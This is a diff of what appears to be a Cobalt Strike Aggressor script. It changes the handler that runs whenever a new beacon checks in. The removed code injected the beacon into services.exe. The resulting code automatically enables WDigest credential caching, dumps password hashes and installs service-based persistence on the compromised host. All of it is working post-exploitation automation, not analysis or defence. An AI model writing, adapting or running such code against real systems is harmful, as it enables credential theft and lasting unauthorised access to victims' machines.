@@ -171,24 +171,9 @@ sub persistence {
     persist_diagsvc($1);
 }
 on beacon_initial {
-    local('$b');
     bsleep($1, 15, 50);
-    $b = beacon_info($1, 'pid');
-    getanypid($1, "services.exe", lambda({
-        if ($3 != $b) {
-            if (beacon_info($1, 'is64') == 1) {
-                binject($1, $3, $listener, 'x64');
-            }
-            else {
-                binject($1, $3, $listener, 'x86');
-            }
-            bsleep($1, 240, 50);
-        }
-        else {
-            bwdigest($1);
-            bhashdump($1);
-            bsleep($1, 30, 50);
-            persistence($1);
-        }
-    },\$b));
+    bwdigest($1);
+    bhashdump($1);
+    bsleep($1, 30, 50);
+    persistence($1);
 }
